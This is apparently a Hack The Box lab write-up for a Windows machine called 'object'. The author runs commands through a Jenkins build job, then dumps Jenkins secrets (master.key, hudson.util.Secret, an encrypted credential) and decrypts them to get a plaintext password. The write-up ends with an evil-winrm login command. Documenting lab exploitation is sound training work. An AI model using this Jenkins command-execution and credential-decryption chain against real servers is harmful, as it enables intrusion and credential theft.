# object

Unfortunately, I did not finish root, I only got user :(

10.129.229.205

nmap/rustscan:

	PORT     STATE SERVICE REASON  VERSION
	80/tcp   open  http    syn-ack Microsoft IIS httpd 10.0
	5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	8080/tcp open  http    syn-ack Jetty 9.4.43.v20210629
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

8080 is Jenkins

port 80: website
email: ideas@object.htb

port 5985 is winrm (so I can login if I get user creds/hash)

## User

Jenkins: http://10.129.229.205:8080/

can create an account, then I should be able to pop a shell on the server by running a jenkins job

add job, and configure remote trigger build in build triggers
http://10.129.229.205:8080/job/testjob/build?token=token123

use "batch command" as a build step to execute code: e.g
```
whoami /all
```

http://10.129.229.205:8080/job/testjob/lastBuild

that worked (check console output):
http://10.129.229.205:8080/job/testjob/1/console

```
Started by remote host 10.10.14.17
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\testjob
[testjob] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins3244147168395895210.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\testjob>whoami /all 

USER INFORMATION
----------------

User Name     SID                                           
============= ==============================================
object\oliver S-1-5-21-4088429403-1159899800-2753317549-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

things to dir and cat
dir /S C:\Users\oliver
type C:\Users\oliver\Desktop\user.txt



http://10.129.229.205:8080/job/testjob/2/consoleFull

	 Directory of C:\Users\oliver

	11/10/2021  03:20 AM    <DIR>          .
	11/10/2021  03:20 AM    <DIR>          ..
	10/20/2021  09:13 PM    <DIR>          .groovy
	10/20/2021  08:56 PM    <DIR>          3D Objects
	10/20/2021  08:56 PM    <DIR>          Contacts
	10/22/2021  02:41 AM    <DIR>          Desktop
	10/20/2021  08:56 PM    <DIR>          Documents
	10/20/2021  08:56 PM    <DIR>          Downloads
	10/20/2021  08:56 PM    <DIR>          Favorites
	10/20/2021  08:56 PM    <DIR>          Links
	10/20/2021  08:56 PM    <DIR>          Music
	10/20/2021  08:56 PM    <DIR>          Pictures
	10/20/2021  08:56 PM    <DIR>          Saved Games
	10/20/2021  08:56 PM    <DIR>          Searches
	10/20/2021  08:56 PM    <DIR>          Videos
				   0 File(s)              0 bytes
	 Directory of C:\Users\oliver\Desktop

	10/22/2021  02:41 AM    <DIR>          .
	10/22/2021  02:41 AM    <DIR>          ..
	10/22/2021  02:41 AM                58 user.txt
				   1 File(s)             58 bytes

task list shows there's probably no AV (no MsMpEng.exe)

```
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\testjob>type C:\Users\oliver\Desktop\user.txt 
HTB{c1_cd_c00k3d_up_1337!}

```

can't make a reverse shell because system can't connect back to me. So I will need to put a webshell instead

```

 Directory of C:\inetpub\wwwroot

10/25/2021  03:36 AM    <DIR>          .
10/25/2021  03:36 AM    <DIR>          ..
10/25/2021  10:21 PM            29,932 index.html
               1 File(s)         29,932 bytes
```

have confirmed that is the webroot by  using curl
```
curl http://10.129.229.205/|wc -c
29932
```

access denied to the webroot..

so I will need to get credentials of oliver somehow and then access via remote management (winrm)

jenkins config in C:\Users\oliver\AppData\Local\Jenkins\.jenkins

```
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\testjob>type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
```

decrypting the credentials in the jenkins  script console:
http://10.129.229.205:8080/script
https://www.shellhacks.com/jenkins-credentials-plugin-decrypt-password/

we need to extract C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets master.key and hudson.util.Secret

```
type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key  
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19

certutil -encode C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret.txt 
Input Length = 272
Output Length = 432
CertUtil: -encode command completed successfully.

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\testjob>type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret.txt 
-----BEGIN CERTIFICATE-----
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu
2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHO
kX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2L
AORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9
GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzc
pBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
-----END CERTIFICATE-----

```

take the hudson.util.Secret.txt , get rid of new lines and decode it via base64 back to 272 bytes

admin_config_snip.xml:
```
 <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
           
```
		   

https://gist.github.com/thesubtlety/e7d26891227f0b68b9d5db1ea9870c62
```
decrypt_jenkins_2.rb ./master.key ./hudson.util.Secret ./admin_config_snip.xml 
oliver:c1cdfun_d2434
```

we have creds!

oliver:c1cdfun_d2434

`evil-winrm -i 10.129.229.205 -u oliver -p c1cdfun_d2434`